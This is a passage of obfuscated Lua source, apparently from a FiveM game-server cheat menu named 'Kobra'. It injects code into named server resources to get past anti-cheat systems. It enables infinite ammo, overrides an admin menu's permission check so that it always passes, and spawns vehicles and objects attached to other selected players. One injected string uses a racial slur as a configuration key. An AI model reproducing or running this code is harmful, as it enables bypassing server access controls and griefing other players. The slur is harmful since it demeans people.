hNative("TaskWarpPedIntoVehicle",function(v1282,...) return v1282(...);end);hNative("SetEntityCoords",function(v1283,...) return v1283(...);end);hNative("GiveWeaponToPed",function(v1284,...) return v1284(...);end);hNative("SetCurrentPedWeapon",function(v1285,...) return v1285(...);end);v1074=10;end end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                    _G.KobraFreecamEnabled = false
                    _G.KobraFreecamThreadRunning = false

                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                    hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                    hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                    hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                    hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                    hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                    hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                    RenderScriptCams(false, false, 0, true, true)
                    if _G.KobraFreecamObject then DestroyCam(_G.KobraFreecamObject, false) _G.KobraFreecamObject = nil end
                    SetFocusEntity(PlayerPedId())
                ]]);end else local v934=0;while true do if (v934==(983 -(815 + 160))) then hNative("ShootSingleBulletBetweenCoords",function(v1138,...) return v1138(...);end);RenderScriptCams(false,false,0 -0 ,true,true);if _G.KobraFreecamObject then local v1226=0 -0 ;while true do if ((0 + 0)==v1226) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if (v934==7) then hNative("IsEntityAVehicle",function(v1139,...) return v1139(...);end);hNative("TaskWarpPedIntoVehicle",function(v1140,...) return v1140(...);end);hNative("SetEntityCoords",function(v1141,...) return v1141(...);end);hNative("GiveWeaponToPed",function(v1142,...) return v1142(...);end);hNative("SetCurrentPedWeapon",function(v1143,...) return v1143(...);end);v934=23 -15 ;end if (v934==2) then hNative("SetCamRot",function(v1144,...) return v1144(...);end);hNative("RenderScriptCams",function(v1145,...) return v1145(...);end);hNative("DestroyCam",function(v1146,...) return v1146(...);end);hNative("SetFocusEntity",function(v1147,...) return v1147(...);end);hNative("SetTextFont",function(v1148,...) return v1148(...);end);v934=1901 -(41 + 1857) ;end if (v934==(1898 -(1222 + 671))) then hNative("GetCamCoord",function(v1149,...) return v1149(...);end);hNative("GetCamRot",function(v1150,...) return v1150(...);end);hNative("IsControlPressed",function(v1151,...) return v1151(...);end);hNative("GetDisabledControlNormal",function(v1152,...) return v1152(...);end);hNative("TaskStandStill",function(v1153,...) return v1153(...);end);v934=15 -9 ;end if (3==v934) then hNative("SetTextProportional",function(v1154,...) return v1154(...);end);hNative("SetTextScale",function(v1155,...) return v1155(...);end);hNative("SetTextDropShadow",function(v1156,...) return v1156(...);end);hNative("SetTextEdge",function(v1157,...) return v1157(...);end);hNative("SetTextOutline",function(v1158,...) return v1158(...);end);v934=5 -1 ;end if (v934==1) then hNative("IsVehicleSeatFree",function(v1159,...) return v1159(...);end);hNative("PlayerPedId",function(v1160,...) return v1160(...);end);hNative("GetEntityCoords",function(v1161,...) return v1161(...);end);hNative("CreateCam",function(v1162,...) return v1162(...);end);hNative("SetCamCoord",function(v1163,...) return v1163(...);end);v934=1184 -(229 + 953) ;end if (v934==(1780 -(1111 + 663))) then hNative("SetFocusPosAndVel",function(v1164,...) return v1164(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1165,...) return v1165(...);end);hNative("GetShapeTestResult",function(v1166,...) return v1166(...);end);hNative("IsControlJustPressed",function(v1167,...) return v1167(...);end);hNative("IsDisabledControlJustPressed",function(v1168,...) return v1168(...);end);v934=1586 -(874 + 705) ;end if (v934==(0 + 0)) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1169,v1170) local v1171=_G[v1169];if ( not v1171 or (type(v1171)~="function")) then return;end _G[v1169]=function(...) return v1170(v1171,...);end;end hNative("CreateThread",function(v1172,...) return v1172(...);end);hNative("Wait",function(v1173,...) return v1173(...);end);v934=1 + 0 ;end if (v934==4) then hNative("SetTextCentre",function(v1174,...) return v1174(...);end);hNative("SetTextColour",function(v1175,...) return v1175(...);end);hNative("BeginTextCommandDisplayText",function(v1176,...) return v1176(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1177,...) return v1177(...);end);hNative("EndTextCommandDisplayText",function(v1178,...) return v1178(...);end);v934=10 -5 ;end end end break;end end end end;v12.EnableInfiniteAmmo=function(v197) if (GetResourceState("WaveShield")=="started") then print("1");local function v510(v584) local v585=0 + 0 ;local v586;while true do if (v585==1) then return v586;end if (v585==(679 -(642 + 37))) then v586="";for v935=1 + 0 , #v584 do v586=v586   .. string.char(v584[v935]) ;end v585=1 + 0 ;end end end local function v511(v587) return _G[v510(v587)];end if  not _G.osintInfAmmo then _G.osintInfAmmo={enabled=false};end _G.osintInfAmmo.enabled=true;local v512=v511({80,562 -(233 + 221) ,86 + 11 ,1662 -(718 + 823) ,101,322 -208 ,80,1326 -(636 + 589) ,237 -137 ,73,80 + 20 });local v513=v511({1086 -(657 + 358) ,267 -166 ,1303 -(1151 + 36) ,22 + 61 ,101,942 -(64 + 770) ,229 -128 ,1342 -(157 + 1086) ,507 -391 ,101,100,80,200 -99 ,100,1304 -(841 + 376) ,101,264 -167 ,287 -175 ,948 -(467 + 370) ,227 -117 });local v514=v511({53 + 18 ,16 + 85 ,636 -(150 + 370) ,1354 -(74 + 1208) ,460 -363 ,505 -(14 + 376) ,68 + 36 ,66 + 9 ,295 -194 ,199 -(23 + 55) });local v515=v511({48 + 23 ,91 + 10 ,116,65,1010 -(652 + 249) ,1977 -(708 + 1160) ,202 -91 ,17 + 56 ,210 -100 ,80,44 + 57 ,100,87,1041 -(850 + 90) ,1487 -(360 + 1030) ,315 -203 ,152 -41 ,1333 -(109 + 1114) });local v516=v511({26 + 39 ,64 + 36 ,81 + 19 ,113 -48 ,1242 -(1076 + 57) ,798 -(579 + 110) ,9 + 102 ,84,518 -(174 + 233) ,140 -60 ,45 + 56 ,100});local v517=v511({61 + 7 ,25 + 86 ,311 -210 ,115,162 -93 ,110,225 -109 ,105,116,638 -(440 + 77) ,69,1676 -(655 + 901) ,105,115,79 + 37 });local v518=v511({350 -263 ,331 -234 ,422 -317 ,270 -154 });local v519={};local function v520(v588) local v589=coroutine.create(v588);local function v590() while coroutine.status(v589)~="dead"  do local v776,v777=coroutine.resume(v589);if  not v776 then print("^1[Kobra InfAmmo] Coroutine error: ^7",v777);break;end v518(1310 -(682 + 628) );end end v590();end if  not _G.osintWaveLoop then local v676=0 + 0 ;while true do if (v676==(299 -(176 + 123))) then _G.osintWaveLoop=true;v520(function() while _G.osintWaveLoop do if _G.osintInfAmmo.enabled then local v1179=0 + 0 ;local v1180;while true do if (v1179==(0 + 0)) then v1180=v512();if v517(v1180) then local v1391=v513(v1180);if (v1391 and (v1391~=v514("WEAPON_UNARMED"))) then local v1508=0;local v1509;local v1510;local v1511;while true do if (v1508==(270 -(239 + 30))) then if  not v519[v1511] then v519[v1511]=v1510;end if (v1510<v519[v1511]) then v516(v1180,v1391,v519[v1511] -v1510 );end break;end if (v1508==0) then v1509,v1510=v515(v1180,v1391);v1511=tostring(v1180);v1508=1 + 0 ;end end end end break;end end else coroutine.yield();end coroutine.yield();end end);break;end end end elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            if not _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = true
                local function ammoLoop()
                    if not _G.infiniteAmmoEnabled then return end
                    local ped = _g(_b("PlayerPedId"))()
                    if ped and _g(_b("DoesEntityExist"))(ped) then
                        local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                        if weapon and weapon ~= _g(_b("GetHashKey"))("WEAPON_UNARMED") then
                            _g(_b("SetPedInfiniteAmmo"))(ped, true, weapon)
                            _g(_b("SetPedInfiniteAmmoClip"))(ped, true)
                        end
                    end
                    Citizen.SetTimeout(100, ammoLoop)
                end
                ammoLoop()
            end
            ]]);end end;v12.DisableInfiniteAmmo=function(v198) if (GetResourceState("WaveShield")=="started") then v48(((GetResourceState("WaveShield")=="started") and "WaveShield") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            if _G.osintInfAmmo then
                _G.osintInfAmmo.enabled = false
            end
        ]]);elseif (GetResourceState("ReaperV4")=="started") then MachoInjectResourceRaw("any",[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);else v48(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("ox_lib")=="started") and "ox_lib") or "any" ,[[
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f or function(...) return Citizen.InvokeNative(GetHashKey(k), ...) end
            end
            if _G.infiniteAmmoEnabled then
                _G.infiniteAmmoEnabled = false
                local ped = _g(_b("PlayerPedId"))()
                if ped and _g(_b("DoesEntityExist"))(ped) then
                    local weapon = _g(_b("GetSelectedPedWeapon"))(ped)
                    if weapon then
                        _g(_b("SetPedInfiniteAmmo"))(ped, false, weapon)
                        _g(_b("SetPedInfiniteAmmoClip"))(ped, false)
                    end
                end
            end
            ]]);end end;v12.AttachSelectedVehicle=function(v199,v200,v201) local v202=0;local v203;local v204;local v205;local v206;local v207;while true do if (v202==3) then v206=GetCurrentServerEndpoint();v207=0 + 0 ;v202=6 -2 ;end if (v202==1) then v203=nil;function v203(v677) local v678=0;local v679;while true do if (v678==1) then return table.concat(v679,",");end if (v678==(0 -0)) then v679={};for v975=316 -(306 + 9) , #v677 do v679[v975]=string.byte(v677,v975);end v678=3 -2 ;end end end v202=2;end if (v202==2) then v204=v201;v205=v203(v204);v202=1 + 2 ;end if (v202==0) then if ( not v200 or ( #v200==(0 + 0))) then v199:Notify("error","Kobra","No players selected!",1445 + 1555 );return;end if ( not v201 or ( #v201==(0 -0))) then local v778=1375 -(1140 + 235) ;while true do if (v778==(0 + 0)) then v199:Notify("error","Kobra","Invalid vehicle model!",2752 + 248 );return;end end end v202=1;end if (4==v202) then for v680,v681 in ipairs(v200) do if (GetResourceState("solos-rentals")=="started") then local v848=0 + 0 ;local v849;local v850;while true do if (0==v848) then print("[vehicle_attach] Fallback: solos-rentals");v849,v850=pcall(function() MachoInjectResource("solos-rentals",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    config.locations["customnigga"] = {
                        vehiclespawncoords = vec4(coords.x, coords.y, coords.z, heading)
                    }
                    TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga", function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v205,v681));end);v848=1;end if (v848==1) then if v849 then v207=v207 + 1 ;end break;end end elseif (GetResourceState("amigo")=="started") then print("[vehicle_attach] Fallback: Amigo RP");local v977,v978=pcall(function() MachoInjectResourceRaw("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v205,v681));end);if v977 then v207=v207 + 1 ;end elseif (GetResourceState("qb-core")=="started") then print("[vehicle_attach] Fallback #02");local v1112,v1113=pcall(function() MachoInjectResource("qb-core",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    QBCore.Functions.SpawnVehicle(model, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end, coords, true, true)
                ]],v205,v681));end);if v1112 then v207=v207 + 1 ;end elseif ((v206:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then print("[vehicle_attach] Fallback #1");local v1227,v1228=pcall(function() MachoInjectResource("drc_gardener",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    SpawnVehicleAndWarpPlayer(model, coords)
                ]],v205,v681));end);if v1227 then v207=v207 + (53 -(33 + 19)) ;end elseif (GetResourceState("lunar_bridge")=="started") then print("[vehicle_attach] Fallback #2");local v1318,v1319=pcall(function() MachoInjectResourceRaw("lunar_bridge",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    Framework.spawnVehicle(model, coords, heading, function(vehicle)
                        if vehicle and DoesEntityExist(vehicle) then
                            SetVehicleOnGroundProperly(vehicle)
                            Citizen.Wait(500)
                            AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                            SetPedIntoVehicle(ped, vehicle, -1)
                        end
                    end)
                ]],v205,v681));end);if v1318 then v207=v207 + 1 ;end elseif (GetResourceState("lation_laundering")=="started") then local v1392=0 + 0 ;local v1393;local v1394;while true do if (v1392==(0 -0)) then print("[vehicle_attach] Fallback #3");v1393,v1394=pcall(function() MachoInjectResourceRaw("lation_laundering",string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local position = vector4(coords.x, coords.y, coords.z + 0.5, heading)
                    local vehicle = SpawnVehicle(model, position)
                    if vehicle and DoesEntityExist(vehicle) then
                        SetVehicleOnGroundProperly(vehicle)
                        Citizen.Wait(500)
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        ShowNotification("~g~Vehicle attached successfully!")
                    end
                ]],v205,v681));end);v1392=1;end if ((1 + 0)==v1392) then if v1393 then v207=v207 + 1 ;end break;end end else local v1395=0 -0 ;local v1396;local v1397;while true do if (v1395==1) then if v1396 then v207=v207 + 1 ;end break;end if (v1395==(0 + 0)) then print("[vehicle_attach] Universal Fallback");v1396,v1397=pcall(function() local v1577=string.format([[
                    local function decode(tbl)
                        local s = ""
                        for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                        return s
                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]],v205,v681);MachoInjectResourceRaw("any",v1577,v681);end);v1395=690 -(586 + 103) ;end end end end break;end end end;function encodeToByteArrayLiteral(v208) if  not v208 then return "";end if (type(v208)~="string") then return tostring(v208);end if ( #v208==0) then return "";end local v209={};for v322=1 + 0 , #v208 do v209[ #v209 + (2 -1) ]=tostring(string.byte(v208,v322));end return table.concat(v209,", ");end v12.SpawnSelectedObject=function(v210,v211) if ( not v211 or ( #v211==0)) then local v521=1488 -(1309 + 179) ;while true do if (v521==0) then v210:Notify("error","Kobra","No players selected!",5415 -2415 );return;end end end local v212=v210:GetSelectedObjectModel();if ( not v212 or ( #v212==0)) then v210:Notify("error","Kobra","Invalid object model!",1306 + 1694 );return;end local v213=encodeToByteArrayLiteral(v212);local v214=0 -0 ;for v324,v325 in ipairs(v211) do if ((GetResourceState("qb-core")=="started") or ((GetResourceState("mc9-core")=="started") and ((GetResourceState("ElectronAC")=="started") or (GetResourceState("FiniAC")=="started") or (GetResourceState("ReaperV4")=="started") or (GetResourceState("WaveShield")=="started")))) then v210:Notify("error","Kobra","Using Qb-core Spawner!",2267 + 733 );MachoInjectResource("qb-core",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]],v213,v325));v214=v214 + (1 -0) ;elseif (GetResourceState("cd_dispatch")=="started") then local v779=0;while true do if (v779==(0 -0)) then print("using fallback");MachoInjectResource("cd_dispatch",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]],v213,v325));v779=610 -(295 + 314) ;end if (v779==(2 -1)) then v214=v214 + 1 ;break;end end elseif (GetResourceState("rcore_drunk")=="started") then local v936=0;while true do if (v936==(1962 -(1300 + 662))) then MachoInjectResourceRaw("rcore_drunk",string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]],v212,v325));v214=v214 + 1 ;break;end end elseif (GetResourceState("lc_fuel")=="started") then MachoInjectResourceRaw("lc_fuel",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]],v212,v325));v214=v214 + (3 -2) ;elseif (GetResourceState("0r-illegalpack")=="started") then local v1181=0;while true do if (v1181==0) then MachoInjectResourceRaw("0r-illegalpack",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]],v212,v325));v214=v214 + 1 ;break;end end elseif (GetResourceState("xradio")=="started") then local v1286=1755 -(1178 + 577) ;while true do if (v1286==(0 + 0)) then MachoInjectResourceRaw("xradio",string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]],v212,v325));v214=v214 + 1 ;break;end end else MachoInjectResourceRaw("any",string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
